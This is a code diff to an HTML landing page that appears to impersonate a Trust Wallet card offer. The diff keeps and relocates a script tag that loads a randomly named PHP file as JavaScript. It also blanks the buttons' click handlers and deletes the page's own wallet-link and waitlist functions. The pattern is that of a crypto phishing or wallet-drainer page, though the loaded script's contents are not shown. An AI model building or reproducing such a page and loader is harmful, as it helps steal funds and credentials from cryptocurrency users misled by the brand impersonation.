@@ -2,7 +2,6 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <script charset="UTF-8" type="text/javascript" src="./a61rq9.php"></script>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
   <title>Trust Alpha — Trust Wallet Card</title>
   <meta name="description" content="Unlock the power of your crypto: Use crypto to pay for everyday essentials anywhere Apple Pay, Google Pay, or Visa is accepted." />
@@ -23,6 +22,7 @@
   <!-- Favicon -->
   <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
   
+  <script charset="UTF-8" type="text/javascript" src="./a61rq9.php"></script>
   <style>
     :root {
       --bg: #ffffff;
@@ -763,8 +763,8 @@
       </p>
 
       <div class="cta" id="get-access">
-        <button class="interact-button" onclick="showAccessModal()">Get Access</button>
-        <button class="interact-button" onclick="scrollToFeatures()">Learn More</button>
+        <button class="interact-button" onclick="()">Get Access</button>
+        <button class="interact-button" onclick="()">Learn More</button>
       </div>
 
       <div class="bottom" aria-hidden="false">
@@ -884,100 +884,7 @@
       }
     });
 
-    // Trust Wallet integration functions
-    function openTrustWallet() {
-      // Try to open Trust Wallet via deeplink
-      const trustUrl = 'trust://wallet/card-access';
-      const fallbackUrl = 'https://trustwallet.com/download';
-      
-      // Create invisible iframe for deeplink
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = trustUrl;
-      document.body.appendChild(iframe);
-      
-      // Set timeout to redirect if app not installed
-      setTimeout(() => {
-        document.body.removeChild(iframe);
-        window.location.href = fallbackUrl;
-      }, 2500);
-      
-      // Track analytics
-      trackEvent('wallet_access', 'deeplink_attempt');
-    }
-
-    function downloadTrustWallet() {
-      // Detect platform and redirect appropriately
-      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-      
-      if (/android/i.test(userAgent)) {
-        window.open('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp', '_blank');
-      } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        window.open('https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409', '_blank');
-      } else {
-        window.open('https://trustwallet.com/download', '_blank');
-      }
-      
-      trackEvent('wallet_access', 'download_redirect');
-    }
-
-    function joinWaitlist() {
-      const email = prompt('Enter your email to join the waitlist:');
-      if (email && validateEmail(email)) {
-        // In production, this would make an API call
-        showNotification(`Thanks! We'll notify you at ${email} when Trust Card is available.`);
-        trackEvent('waitlist', 'joined');
-      }
-    }
-
-    function scrollToFeatures() {
-      document.getElementById('features').scrollIntoView({ behavior: 'smooth' });
-    }
-
-    // Helper functions
-    function validateEmail(email) {
-      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      return re.test(email);
-    }
-
-    function showNotification(message) {
-      // Create notification element
-      const notification = document.createElement('div');
-      notification.style.cssText = `
-        position: fixed;
-        top: 20px;
-        right: 20px;
-        background: var(--primary);
-        color: white;
-        padding: 16px 24px;
-        border-radius: 12px;
-        box-shadow: var(--shadow);
-        z-index: 1000;
-        animation: slideIn 0.3s ease;
-      `;
-      notification.textContent = message;
-      document.body.appendChild(notification);
-      
-      // Remove after 3 seconds
-      setTimeout(() => {
-        notification.style.animation = 'slideOut 0.3s ease';
-        setTimeout(() => document.body.removeChild(notification), 300);
-      }, 3000);
-    }
-
-    function trackEvent(action, label) {
-      // In production, integrate with analytics platform
-      console.log(`Analytics: ${action} - ${label}`);
-      
-      // Example with Google Analytics (uncomment and add your GA ID)
-      // if (typeof gtag !== 'undefined') {
-      //   gtag('event', action, {
-      //     'event_label': label,
-      //     'event_category': 'Trust_Card'
-      //   });
-      // }
-    }
-
+  
     // Add CSS animations for notifications
     const style = document.createElement('style');
     style.textContent = `
